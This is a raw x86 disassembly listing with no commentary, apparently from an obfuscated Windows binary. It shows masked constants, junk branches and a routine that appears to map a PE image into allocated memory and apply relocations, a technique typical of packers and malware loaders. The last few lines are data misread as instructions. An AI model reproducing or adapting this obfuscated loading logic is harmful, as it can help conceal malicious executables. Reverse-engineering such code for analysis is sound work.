  41968e:	mov    eax,DWORD PTR [ebp-0x4]
  419691:	sub    eax,edi
  419693:	xor    eax,esi
  419695:	mov    DWORD PTR [ebp-0x8],eax
  419698:	lea    ebx,[ebp-0x8]
  41969b:	call   0x419580
  4196a0:	mov    DWORD PTR [ebp-0x8],eax
  4196a3:	mov    eax,DWORD PTR [ebp-0x8]
  4196a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4196a9:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4196b0:	mov    eax,DWORD PTR [ebp-0xc]
  4196b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4196b6:	xor    eax,esi
  4196b8:	lea    eax,[eax+ecx*1+0x3272e2]
  4196bf:	mov    DWORD PTR [ebp-0x4],eax
  4196c2:	mov    eax,DWORD PTR [ebp-0x18]
  4196c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4196c8:	xor    ecx,esi
  4196ca:	xor    eax,esi
  4196cc:	sub    eax,ecx
  4196ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4196d1:	cmp    ecx,eax
  4196d3:	jbe    0x41968e
  4196d5:	mov    eax,DWORD PTR [ebp-0x1c]
  4196d8:	xor    eax,esi
  4196da:	add    eax,edi
  4196dc:	mov    DWORD PTR [ebp-0x8],eax
  4196df:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  4196e6:	mov    ebx,ebx
  4196e8:	jmp    0x41974b
  4196ea:	mov    ecx,DWORD PTR [ebp-0x20]
  4196ed:	mov    eax,DWORD PTR [ebp-0x8]
  4196f0:	xor    ecx,esi
  4196f2:	add    ecx,edi
  4196f4:	shr    eax,cl
  4196f6:	mov    DWORD PTR [ebp-0x4],eax
  4196f9:	mov    eax,DWORD PTR [ebp+0x8]
  4196fc:	mov    cl,BYTE PTR [eax]
  4196fe:	mov    BYTE PTR [ebp+0xb],cl
  419701:	mov    cl,BYTE PTR [ebp+0xb]
  419704:	mov    edx,DWORD PTR [ebp-0x8]
  419707:	movzx  ecx,cl
  41970a:	xor    ecx,edx
  41970c:	mov    DWORD PTR [ebp+0x8],ecx
  41970f:	mov    ecx,DWORD PTR [ebp-0x18]
  419712:	mov    edx,DWORD PTR [ebp+0x8]
  419715:	xor    ecx,esi
  419717:	add    ecx,edi
  419719:	and    ecx,edx
  41971b:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  419722:	mov    edx,DWORD PTR [ebp-0x4]
  419725:	xor    ecx,edx
  419727:	mov    DWORD PTR [ebp-0x8],ecx
  41972a:	mov    ecx,DWORD PTR [ebp-0xc]
  41972d:	xor    ecx,esi
  41972f:	lea    eax,[eax+ecx*1+0x3272e2]
  419736:	mov    DWORD PTR [ebp+0x8],eax
  419739:	mov    eax,DWORD PTR [ebp-0xc]
  41973c:	xor    eax,esi
  41973e:	mov    ecx,0xffcd8d1e
  419743:	sub    ecx,eax
  419745:	add    ecx,DWORD PTR [ebp-0x10]
  419748:	mov    DWORD PTR [ebp-0x10],ecx
  41974b:	mov    eax,DWORD PTR [ebp-0x14]
  41974e:	mov    ecx,DWORD PTR [ebp-0x10]
  419751:	xor    eax,esi
  419753:	add    eax,edi
  419755:	cmp    ecx,eax
  419757:	jne    0x4196ea
  419759:	mov    eax,DWORD PTR [ebp-0x1c]
  41975c:	mov    ecx,DWORD PTR [ebp-0x8]
  41975f:	xor    eax,esi
  419761:	add    eax,edi
  419763:	pop    edi
  419764:	pop    esi
  419765:	xor    eax,ecx
  419767:	pop    ebx
  419768:	leave  
  419769:	ret    0x4
  41976c:	push   ebp
  41976d:	mov    ebp,esp
  41976f:	mov    eax,DWORD PTR [ebp+0x1c]
  419772:	mov    ecx,DWORD PTR [ebp+0x8]
  419775:	mov    edx,DWORD PTR [ebp+0x10]
  419778:	mov    eax,DWORD PTR [eax+0x190]
  41977e:	mov    eax,DWORD PTR [eax]
  419780:	sub    esp,0x64
  419783:	push   ebx
  419784:	push   esi
  419785:	push   edi
  419786:	mov    edi,0x751089b
  41978b:	xor    ecx,edi
  41978d:	mov    ebx,0x3272e2
  419792:	add    ecx,ebx
  419794:	cmp    ecx,edx
  419796:	jne    0x4197a7
  419798:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  4197a2:	jmp    0x419ca3
  4197a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4197aa:	mov    esi,DWORD PTR [ebp+0x14]
  4197ad:	mov    edx,DWORD PTR [esi]
  4197af:	xor    ecx,edi
  4197b1:	add    ecx,ebx
  4197b3:	cmp    edx,ecx
  4197b5:	je     0x419c5e
  4197bb:	mov    ecx,DWORD PTR [ebp+0x1c]
  4197be:	mov    DWORD PTR [ebp-0x1c],eax
  4197c1:	mov    DWORD PTR [ebp+0x1c],ecx
  4197c4:	mov    ecx,DWORD PTR [ebp+0x18]
  4197c7:	mov    eax,DWORD PTR [esi]
  4197c9:	mov    DWORD PTR [ebp-0x20],eax
  4197cc:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  4197d3:	mov    edx,0xf89c8584
  4197d8:	mov    DWORD PTR [ebp-0x8],edx
  4197db:	mov    eax,DWORD PTR [ebp+0x1c]
  4197de:	mov    DWORD PTR [ebp+0x1c],eax
  4197e1:	mov    eax,DWORD PTR [ebp+0x1c]
  4197e4:	mov    eax,DWORD PTR [eax+0x190]
  4197ea:	mov    eax,DWORD PTR [eax]
  4197ec:	mov    DWORD PTR [ebp-0x24],ecx
  4197ef:	mov    ecx,DWORD PTR [ebp+0x1c]
  4197f2:	mov    ecx,DWORD PTR [ecx+0x190]
  4197f8:	mov    ecx,DWORD PTR [ecx]
  4197fa:	add    ecx,DWORD PTR [eax+0x3c]
  4197fd:	mov    DWORD PTR [ebp+0x10],ecx
  419800:	mov    eax,DWORD PTR [ebp+0x8]
  419803:	xor    eax,edi
  419805:	add    eax,ebx
  419807:	mov    DWORD PTR [ebp-0x4],eax
  41980a:	mov    eax,DWORD PTR [ebp+0x8]
  41980d:	xor    eax,edi
  41980f:	add    eax,ebx
  419811:	mov    DWORD PTR [ebp+0x18],eax
  419814:	mov    eax,DWORD PTR [ebp+0x10]
  419817:	mov    eax,DWORD PTR [eax+0x50]
  41981a:	sub    eax,0xc
  41981d:	mov    DWORD PTR [ebp-0x28],eax
  419820:	mov    eax,DWORD PTR [ebp+0x10]
  419823:	mov    eax,DWORD PTR [eax+0x38]
  419826:	mov    ecx,DWORD PTR [ebp+0x10]
  419829:	dec    eax
  41982a:	test   DWORD PTR [ecx+0x54],eax
  41982d:	mov    eax,DWORD PTR [ebp+0x10]
  419830:	je     0x41984a
  419832:	mov    eax,DWORD PTR [eax+0x38]
  419835:	mov    ecx,DWORD PTR [ebp+0x10]
  419838:	mov    ecx,DWORD PTR [ecx+0x54]
  41983b:	dec    eax
  41983c:	not    eax
  41983e:	and    ecx,eax
  419840:	mov    eax,DWORD PTR [ebp+0x10]
  419843:	mov    eax,DWORD PTR [eax+0x38]
  419846:	add    eax,ecx
  419848:	jmp    0x41984d
  41984a:	mov    eax,DWORD PTR [eax+0x54]
  41984d:	mov    DWORD PTR [ebp+0x1c],eax
  419850:	mov    eax,DWORD PTR [ebp+0x8]
  419853:	xor    eax,edi
  419855:	add    eax,ebx
  419857:	mov    DWORD PTR [ebp+0x18],eax
  41985a:	mov    eax,DWORD PTR [ebp+0x8]
  41985d:	xor    eax,edi
  41985f:	add    eax,ebx
  419861:	mov    DWORD PTR [ebp+0x18],eax
  419864:	mov    eax,DWORD PTR [ebp+0x8]
  419867:	mov    ecx,DWORD PTR [ebp-0x24]
  41986a:	xor    eax,edi
  41986c:	add    eax,ebx
  41986e:	mov    DWORD PTR [ecx],eax
  419870:	mov    DWORD PTR [ebp+0x18],edx
  419873:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  41987a:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  419881:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  419888:	mov    eax,DWORD PTR [ebp-0x8]
  41988b:	mov    ecx,DWORD PTR [ebp+0x1c]
  41988e:	xor    eax,edi
  419890:	add    eax,ebx
  419892:	imul   eax,ecx
  419895:	mov    ecx,DWORD PTR [ebp+0x8]
  419898:	mov    edx,DWORD PTR [ebp-0x28]
  41989b:	xor    ecx,edi
  41989d:	lea    ecx,[ecx+edx*1+0x3272e2]
  4198a4:	cmp    eax,ecx
  4198a6:	jae    0x419c57
  4198ac:	mov    eax,DWORD PTR [ebp+0x8]
  4198af:	xor    eax,edi
  4198b1:	add    eax,ebx
  4198b3:	mov    DWORD PTR [ebp+0x18],eax
  4198b6:	mov    eax,DWORD PTR [ebp+0x1c]
  4198b9:	add    eax,DWORD PTR [ebp-0x1c]
  4198bc:	mov    DWORD PTR [ebp-0x4],eax
  4198bf:	push   DWORD PTR [ebp-0x4]
  4198c2:	mov    esi,DWORD PTR [ebp-0x1c]
  4198c5:	mov    ecx,DWORD PTR [ebp+0x10]
  4198c8:	call   0x4189c0
  4198cd:	mov    DWORD PTR [ebp+0xc],eax
  4198d0:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4198d7:	mov    eax,DWORD PTR [ebp-0x18]
  4198da:	xor    eax,edi
  4198dc:	lea    ecx,[ebp-0x40]
  4198df:	add    eax,ebx
  4198e1:	push   ecx
  4198e2:	call   0x418fa3
  4198e7:	mov    eax,DWORD PTR [ebp+0xc]
  4198ea:	test   eax,eax
  4198ec:	je     0x41993c
  4198ee:	mov    eax,DWORD PTR [ebp-0x18]
  4198f1:	xor    eax,edi
  4198f3:	add    eax,ebx
  4198f5:	push   eax
  4198f6:	push   DWORD PTR [ebp+0xc]
  4198f9:	lea    eax,[ebp-0x40]
  4198fc:	push   eax
  4198fd:	call   0x418e4a
  419902:	mov    eax,DWORD PTR [ebp-0x4]
  419905:	mov    DWORD PTR [ebp-0x18],eax
  419908:	mov    eax,DWORD PTR [ebp-0x18]
  41990b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41990e:	sub    eax,ecx
  419910:	mov    DWORD PTR [ebp-0x18],eax
  419913:	mov    eax,DWORD PTR [ebp+0xc]
  419916:	mov    ecx,DWORD PTR [ebp+0xc]
  419919:	mov    eax,DWORD PTR [eax+0x10]
  41991c:	add    eax,DWORD PTR [ecx+0xc]
  41991f:	mov    ecx,DWORD PTR [ebp-0x18]
  419922:	cmp    ecx,eax
  419924:	jb     0x41993c
  419926:	mov    eax,DWORD PTR [ebp+0xc]
  419929:	mov    eax,DWORD PTR [eax+0xc]
  41992c:	mov    ecx,DWORD PTR [ebp+0xc]
  41992f:	add    eax,DWORD PTR [ecx+0x8]
  419932:	mov    ecx,DWORD PTR [ebp-0x18]
  419935:	sub    eax,ecx
  419937:	jmp    0x419c2a
  41993c:	push   0xc
  41993e:	push   DWORD PTR [ebp-0x4]
  419941:	lea    eax,[ebp-0x4c]
  419944:	push   eax
  419945:	call   0x418e4a
  41994a:	mov    eax,0xf89c8585
  41994f:	mov    DWORD PTR [ebp-0x2c],eax
  419952:	mov    DWORD PTR [ebp-0x30],0xf89c8584
  419959:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  419960:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  419967:	lea    ecx,[ebp-0x2c]
  41996a:	mov    DWORD PTR [ebp-0xc],ecx
  41996d:	lea    ecx,[ebp-0x30]
  419970:	mov    DWORD PTR [ebp-0x10],ecx
  419973:	lea    ecx,[ebp-0x34]
  419976:	mov    DWORD PTR [ebp+0xc],ecx
  419979:	lea    ecx,[ebp-0x38]
  41997c:	mov    DWORD PTR [ebp-0x14],ecx
  41997f:	mov    ecx,DWORD PTR [ebp+0x8]
  419982:	xor    ecx,edi
  419984:	add    ecx,ebx
  419986:	mov    DWORD PTR [ebp-0x18],ecx
  419989:	jmp    0x419b85
  41998e:	cmp    eax,0xf89c85bb
  419993:	je     0x419b97
  419999:	mov    ecx,DWORD PTR [ebp-0x8]
  41999c:	xor    ecx,edi
  41999e:	mov    esi,eax
  4199a0:	add    ecx,ebx
  4199a2:	mov    DWORD PTR [ebp+0x18],ecx
  4199a5:	mov    eax,DWORD PTR [ebp-0x18]
  4199a8:	xor    esi,edi
  4199aa:	lea    eax,[eax+esi*1+0x3272e2]
  4199b1:	mov    DWORD PTR [ebp-0x18],eax
  4199b4:	mov    eax,DWORD PTR [ebp-0x8]
  4199b7:	mov    ecx,DWORD PTR [ebp-0x18]
  4199ba:	xor    eax,edi
  4199bc:	add    eax,ebx
  4199be:	cmp    ecx,eax
  4199c0:	jne    0x4199d5
  4199c2:	mov    eax,DWORD PTR [ebp+0x8]
  4199c5:	xor    eax,edi
  4199c7:	add    eax,ebx
  4199c9:	push   eax
  4199ca:	push   0xc
  4199cc:	lea    eax,[ebp-0x4c]
  4199cf:	push   eax
  4199d0:	call   0x4193d7
  4199d5:	mov    eax,DWORD PTR [ebp-0xc]
  4199d8:	mov    eax,DWORD PTR [eax]
  4199da:	xor    eax,edi
  4199dc:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4199e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4199e6:	xor    ecx,edi
  4199e8:	movzx  eax,al
  4199eb:	add    ecx,ebx
  4199ed:	cmp    eax,ecx
  4199ef:	je     0x419b6d
  4199f5:	mov    eax,DWORD PTR [ebp-0x10]
  4199f8:	mov    eax,DWORD PTR [eax]
  4199fa:	xor    eax,edi
  4199fc:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a03:	mov    ecx,DWORD PTR [ebp+0x8]
  419a06:	xor    ecx,edi
  419a08:	movzx  eax,al
  419a0b:	add    ecx,ebx
  419a0d:	cmp    eax,ecx
  419a0f:	je     0x419b6d
  419a15:	mov    eax,DWORD PTR [ebp+0xc]
  419a18:	mov    eax,DWORD PTR [eax]
  419a1a:	xor    eax,edi
  419a1c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a23:	mov    ecx,DWORD PTR [ebp+0x8]
  419a26:	xor    ecx,edi
  419a28:	movzx  eax,al
  419a2b:	add    ecx,ebx
  419a2d:	cmp    eax,ecx
  419a2f:	je     0x419b6d
  419a35:	mov    eax,DWORD PTR [ebp-0x14]
  419a38:	mov    eax,DWORD PTR [eax]
  419a3a:	xor    eax,edi
  419a3c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a43:	mov    ecx,DWORD PTR [ebp+0x8]
  419a46:	xor    ecx,edi
  419a48:	movzx  eax,al
  419a4b:	add    ecx,ebx
  419a4d:	cmp    eax,ecx
  419a4f:	je     0x419b6d
  419a55:	mov    eax,DWORD PTR [ebp-0x10]
  419a58:	mov    eax,DWORD PTR [eax]
  419a5a:	xor    eax,edi
  419a5c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a63:	mov    ecx,DWORD PTR [ebp-0xc]
  419a66:	mov    ecx,DWORD PTR [ecx]
  419a68:	xor    ecx,edi
  419a6a:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419a71:	xor    al,cl
  419a73:	mov    ecx,DWORD PTR [ebp+0xc]
  419a76:	mov    ecx,DWORD PTR [ecx]
  419a78:	xor    ecx,edi
  419a7a:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419a81:	or     al,cl
  419a83:	mov    ecx,DWORD PTR [ebp-0xc]
  419a86:	mov    ecx,DWORD PTR [ecx]
  419a88:	xor    ecx,edi
  419a8a:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419a91:	cmp    cl,al
  419a93:	jne    0x419b6d
  419a99:	mov    eax,DWORD PTR [ebp+0xc]
  419a9c:	mov    eax,DWORD PTR [eax]
  419a9e:	xor    eax,edi
  419aa0:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419aa7:	mov    ecx,DWORD PTR [ebp-0x10]
  419aaa:	mov    ecx,DWORD PTR [ecx]
  419aac:	xor    ecx,edi
  419aae:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419ab5:	xor    al,cl
  419ab7:	mov    ecx,DWORD PTR [ebp-0x14]
  419aba:	mov    ecx,DWORD PTR [ecx]
  419abc:	xor    ecx,edi
  419abe:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419ac5:	or     al,cl
  419ac7:	mov    ecx,DWORD PTR [ebp-0x10]
  419aca:	mov    ecx,DWORD PTR [ecx]
  419acc:	xor    ecx,edi
  419ace:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419ad5:	cmp    cl,al
  419ad7:	jne    0x419b6d
  419add:	mov    eax,DWORD PTR [ebp-0x14]
  419ae0:	mov    eax,DWORD PTR [eax]
  419ae2:	xor    eax,edi
  419ae4:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419aeb:	mov    ecx,DWORD PTR [ebp+0xc]
  419aee:	mov    ecx,DWORD PTR [ecx]
  419af0:	xor    ecx,edi
  419af2:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419af9:	xor    al,cl
  419afb:	mov    ecx,DWORD PTR [ebp-0xc]
  419afe:	mov    ecx,DWORD PTR [ecx]
  419b00:	xor    ecx,edi
  419b02:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b09:	or     al,cl
  419b0b:	mov    ecx,DWORD PTR [ebp+0xc]
  419b0e:	mov    ecx,DWORD PTR [ecx]
  419b10:	xor    ecx,edi
  419b12:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419b19:	cmp    cl,al
  419b1b:	jne    0x419b6d
  419b1d:	mov    eax,DWORD PTR [ebp-0x14]
  419b20:	mov    eax,DWORD PTR [eax]
  419b22:	xor    eax,edi
  419b24:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419b2b:	mov    ecx,DWORD PTR [ebp-0xc]
  419b2e:	mov    ecx,DWORD PTR [ecx]
  419b30:	xor    ecx,edi
  419b32:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b39:	xor    al,cl
  419b3b:	mov    ecx,DWORD PTR [ebp-0x10]
  419b3e:	mov    ecx,DWORD PTR [ecx]
  419b40:	xor    ecx,edi
  419b42:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b49:	or     al,cl
  419b4b:	mov    ecx,DWORD PTR [ebp-0x14]
  419b4e:	mov    ecx,DWORD PTR [ecx]
  419b50:	xor    ecx,edi
  419b52:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419b59:	cmp    cl,al
  419b5b:	jne    0x419b6d
  419b5d:	lea    eax,[ebp-0x4c]
  419b60:	push   eax
  419b61:	call   0x419628
  419b66:	mov    ecx,DWORD PTR [ebp-0x44]
  419b69:	cmp    eax,ecx
  419b6b:	je     0x419b77
  419b6d:	mov    eax,DWORD PTR [ebp+0x8]
  419b70:	xor    eax,edi
  419b72:	add    eax,ebx
  419b74:	mov    DWORD PTR [ebp+0x18],eax
  419b77:	mov    eax,DWORD PTR [ebp-0x8]
  419b7a:	xor    eax,edi
  419b7c:	lea    eax,[eax+esi*1+0x3272e2]
  419b83:	xor    eax,edi
  419b85:	mov    ecx,DWORD PTR [ebp+0x8]
  419b88:	mov    edx,DWORD PTR [ebp+0x18]
  419b8b:	xor    ecx,edi
  419b8d:	add    ecx,ebx
  419b8f:	cmp    edx,ecx
  419b91:	je     0x41998e
  419b97:	mov    eax,DWORD PTR [ebp+0x8]
  419b9a:	mov    ecx,DWORD PTR [ebp+0x18]
  419b9d:	xor    eax,edi
  419b9f:	add    eax,ebx
  419ba1:	cmp    ecx,eax
  419ba3:	jne    0x419bb6
  419ba5:	mov    eax,DWORD PTR [ebp-0x8]
  419ba8:	mov    ecx,DWORD PTR [ebp+0x1c]
  419bab:	xor    eax,edi
  419bad:	lea    eax,[eax+ecx*1+0x3272e2]
  419bb4:	jmp    0x419c2d
  419bb6:	push   0x18
  419bb8:	push   DWORD PTR [ebp-0x4]
  419bbb:	lea    eax,[ebp-0x64]
  419bbe:	push   eax
  419bbf:	call   0x418e4a
  419bc4:	mov    eax,DWORD PTR [ebp+0x8]
  419bc7:	mov    ecx,DWORD PTR [ebp-0x18]
  419bca:	xor    eax,edi
  419bcc:	add    eax,ebx
  419bce:	cmp    eax,ecx
  419bd0:	je     0x419be5
  419bd2:	mov    eax,DWORD PTR [ebp+0x8]
  419bd5:	xor    eax,edi
  419bd7:	add    eax,ebx
  419bd9:	push   eax
  419bda:	push   0x18
  419bdc:	lea    eax,[ebp-0x64]
  419bdf:	push   eax
  419be0:	call   0x4193d7
  419be5:	mov    eax,DWORD PTR [ebp-0x4]
  419be8:	add    eax,0x18
  419beb:	mov    DWORD PTR [ebp+0x18],eax
  419bee:	push   DWORD PTR [ebp-0x50]
  419bf1:	push   DWORD PTR [ebp+0x18]
  419bf4:	mov    eax,DWORD PTR [ebp-0x54]
  419bf7:	add    eax,DWORD PTR [ebp-0x20]
  419bfa:	push   eax
  419bfb:	call   0x418e4a
  419c00:	mov    eax,DWORD PTR [ebp+0x8]
  419c03:	mov    ecx,DWORD PTR [ebp-0x18]
  419c06:	xor    eax,edi
  419c08:	add    eax,ebx
  419c0a:	cmp    eax,ecx
  419c0c:	je     0x419c1f
  419c0e:	push   0x0
  419c10:	push   DWORD PTR [ebp-0x50]
  419c13:	mov    eax,DWORD PTR [ebp-0x54]
  419c16:	add    eax,DWORD PTR [ebp-0x20]
  419c19:	push   eax
  419c1a:	call   0x4193d7
  419c1f:	mov    eax,DWORD PTR [ebp-0x24]
  419c22:	mov    ecx,DWORD PTR [ebp-0x50]
  419c25:	add    DWORD PTR [eax],ecx
  419c27:	mov    eax,DWORD PTR [ebp-0x50]
  419c2a:	add    eax,DWORD PTR [ebp+0x1c]
  419c2d:	mov    DWORD PTR [ebp+0x1c],eax
  419c30:	mov    eax,DWORD PTR [ebp-0x8]
  419c33:	mov    ecx,DWORD PTR [ebp+0x1c]
  419c36:	xor    eax,edi
  419c38:	add    eax,ebx
  419c3a:	imul   eax,ecx
  419c3d:	mov    ecx,DWORD PTR [ebp+0x8]
  419c40:	mov    edx,DWORD PTR [ebp-0x28]
  419c43:	xor    ecx,edi
  419c45:	lea    ecx,[ecx+edx*1+0x3272e2]
  419c4c:	cmp    eax,ecx
  419c4e:	jb     0x4198ac
  419c54:	mov    esi,DWORD PTR [ebp+0x14]
  419c57:	mov    eax,DWORD PTR [ebp-0x20]
  419c5a:	mov    DWORD PTR [esi],eax
  419c5c:	jmp    0x419ca3
  419c5e:	mov    ecx,DWORD PTR [ebp+0x8]
  419c61:	mov    edx,DWORD PTR [ebp+0xc]
  419c64:	xor    ecx,edi
  419c66:	xor    edx,edi
  419c68:	add    ecx,ebx
  419c6a:	add    edx,ebx
  419c6c:	cmp    ecx,edx
  419c6e:	jne    0x419c82
  419c70:	mov    eax,ds:0x7f642d1e
  419c75:	imul   eax,eax,0x9f15fcef
  419c7b:	mov    ds:0x7f642d1e,eax
  419c80:	jmp    0x419ca3
  419c82:	mov    ecx,DWORD PTR [ebp+0x8]
  419c85:	xor    ecx,edi
  419c87:	add    ecx,ebx
  419c89:	cmp    eax,ecx
  419c8b:	je     0x419c99
  419c8d:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  419c97:	jmp    0x419ca3
  419c99:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  419ca3:	pop    edi
  419ca4:	pop    esi
  419ca5:	pop    ebx
  419ca6:	leave  
  419ca7:	ret    0x18
  419caa:	push   ebp
  419cab:	mov    ebp,esp
  419cad:	and    esp,0xfffffff8
  419cb0:	mov    eax,DWORD PTR [ebp+0x20]
  419cb3:	sub    esp,0x14
  419cb6:	push   ebx
  419cb7:	mov    ebx,DWORD PTR [ebp+0x14]
  419cba:	push   esi
  419cbb:	push   edi
  419cbc:	cmp    eax,0xf89c8585
  419cc1:	jne    0x419ccd
  419cc3:	push   0xf89c8584
  419cc8:	jmp    0x419dff
  419ccd:	mov    eax,DWORD PTR [ebp+0x20]
  419cd0:	cmp    eax,0xf89c8584
  419cd5:	jne    0x419ce1
  419cd7:	push   0xf89c85bb
  419cdc:	jmp    0x419dff
  419ce1:	mov    eax,DWORD PTR [ebp+0x20]
  419ce4:	cmp    eax,0xf89c85bb
  419ce9:	jne    0x419cf5
  419ceb:	push   0xf89c85ba
  419cf0:	jmp    0x419dff
  419cf5:	mov    eax,DWORD PTR [ebp+0x20]
  419cf8:	cmp    eax,0xf89c85ba
  419cfd:	jne    0x419d09
  419cff:	push   0xf89c85b9
  419d04:	jmp    0x419dff
  419d09:	mov    ecx,DWORD PTR [ebp+0x20]
  419d0c:	mov    eax,0xf89c85be
  419d11:	cmp    ecx,eax
  419d13:	jne    0x419dcf
  419d19:	mov    eax,DWORD PTR [ebp+0x10]
  419d1c:	mov    DWORD PTR [esp+0xc],eax
  419d20:	mov    eax,DWORD PTR [ebp+0x18]
  419d23:	mov    DWORD PTR [esp+0x14],eax
  419d27:	mov    eax,DWORD PTR [ebp+0xc]
  419d2a:	mov    DWORD PTR [esp+0x18],eax
  419d2e:	mov    eax,DWORD PTR [ebp+0x8]
  419d31:	mov    DWORD PTR [esp+0x10],eax
  419d35:	mov    eax,DWORD PTR [esp+0x10]
  419d39:	mov    ecx,DWORD PTR [esp+0x14]
  419d3d:	mov    edi,0x751089b
  419d42:	xor    eax,edi
  419d44:	mov    esi,0x3272e2
  419d49:	add    eax,esi
  419d4b:	mov    DWORD PTR [ecx],eax
  419d4d:	mov    eax,DWORD PTR [esp+0xc]
  419d51:	mov    eax,DWORD PTR [eax+0x194]
  419d57:	mov    ecx,DWORD PTR [eax]
  419d59:	mov    eax,DWORD PTR [esp+0xc]
  419d5d:	mov    eax,DWORD PTR [eax+0x194]
  419d63:	mov    eax,DWORD PTR [eax]
  419d65:	add    eax,DWORD PTR [ecx+0x3c]
  419d68:	mov    ecx,DWORD PTR [esp+0xc]
  419d6c:	mov    ecx,DWORD PTR [ecx+0x1d8]
  419d72:	mov    ecx,DWORD PTR [ecx+0x14]
  419d75:	push   0x4
  419d77:	push   0x3000
  419d7c:	push   DWORD PTR [eax+0x50]
  419d7f:	push   0x0
  419d81:	call   ecx
  419d83:	mov    DWORD PTR [ebx],eax
  419d85:	mov    eax,DWORD PTR [esp+0x10]
  419d89:	push   DWORD PTR [esp+0xc]
  419d8d:	xor    eax,edi
  419d8f:	add    eax,esi
  419d91:	mov    DWORD PTR [esp+0x20],eax
  419d95:	lea    eax,[esp+0x20]
  419d99:	push   eax
  419d9a:	push   ebx
  419d9b:	push   DWORD PTR [esp+0x20]
  419d9f:	push   DWORD PTR [esp+0x28]
  419da3:	push   DWORD PTR [esp+0x24]
  419da7:	call   0x41976c
  419dac:	mov    eax,DWORD PTR [esp+0x10]
  419db0:	mov    ecx,DWORD PTR [ebx]
  419db2:	xor    eax,edi
  419db4:	add    eax,esi
  419db6:	cmp    ecx,eax
  419db8:	je     0x419e16
  419dba:	mov    eax,DWORD PTR [esp+0x18]
  419dbe:	mov    ecx,DWORD PTR [esp+0x14]
  419dc2:	xor    eax,edi
  419dc4:	add    eax,esi
  419dc6:	imul   eax,DWORD PTR [esp+0x1c]
  419dcb:	mov    DWORD PTR [ecx],eax
  419dcd:	jmp    0x419e16
  419dcf:	mov    ecx,DWORD PTR [ebp+0x20]
  419dd2:	cmp    ecx,0xf89c85b9
  419dd8:	jne    0x419de1
  419dda:	push   0xf89c85b8
  419ddf:	jmp    0x419dff
  419de1:	mov    ecx,DWORD PTR [ebp+0x20]
  419de4:	cmp    ecx,0xf89c85b8
  419dea:	jne    0x419df3
  419dec:	push   0xf89c85bf
  419df1:	jmp    0x419dff
  419df3:	mov    ecx,DWORD PTR [ebp+0x20]
  419df6:	cmp    ecx,0xf89c85bf
  419dfc:	jne    0x419e16
  419dfe:	push   eax
  419dff:	push   DWORD PTR [ebp+0x1c]
  419e02:	push   DWORD PTR [ebp+0x18]
  419e05:	push   ebx
  419e06:	push   DWORD PTR [ebp+0x10]
  419e09:	push   DWORD PTR [ebp+0xc]
  419e0c:	push   DWORD PTR [ebp+0x8]
  419e0f:	call   0x419caa
  419e14:	mov    DWORD PTR [ebx],eax
  419e16:	mov    eax,DWORD PTR [ebx]
  419e18:	pop    edi
  419e19:	pop    esi
  419e1a:	pop    ebx
  419e1b:	mov    esp,ebp
  419e1d:	pop    ebp
  419e1e:	ret    0x1c
  419e21:	push   ebp
  419e22:	mov    ebp,esp
  419e24:	sub    esp,0xc
  419e27:	mov    eax,0xf89c8585
  419e2c:	mov    DWORD PTR [ebp-0x8],eax
  419e2f:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  419e36:	mov    ecx,DWORD PTR [ebp-0x8]
  419e39:	xor    ecx,0x751089b
  419e3f:	add    ecx,0x3272e2
  419e45:	mov    DWORD PTR [ebp-0x4],ecx
  419e48:	mov    ecx,DWORD PTR [ebp+0xc]
  419e4b:	push   eax
  419e4c:	mov    DWORD PTR [ebp+0xc],ecx
  419e4f:	push   DWORD PTR [ebp+0xc]
  419e52:	lea    eax,[ebp-0x4]
  419e55:	push   DWORD PTR [ebp+0x8]
  419e58:	push   eax
  419e59:	push   DWORD PTR [ebp+0xc]
  419e5c:	push   DWORD PTR [ebp-0xc]
  419e5f:	push   DWORD PTR [ebp-0x8]
  419e62:	call   0x419caa
  419e67:	mov    DWORD PTR [ebp-0x4],eax
  419e6a:	mov    eax,DWORD PTR [ebp-0x4]
  419e6d:	leave  
  419e6e:	ret    0x8
  419e71:	dec    esp
  419e72:	inc    ecx
  419e73:	mov    ebp,0xeffebd16
  419e78:	pop    ebx
  419e79:	xchg   ebx,eax
  419e7a:	and    DWORD PTR [ebx-0x47],0xb74f463a
  419e81:	gs sbb al,0x1
  419e84:	add    BYTE PTR [esi+0x38000003],ch
  419e8a:	loope  0x419eea
  419e8c:	push   ss
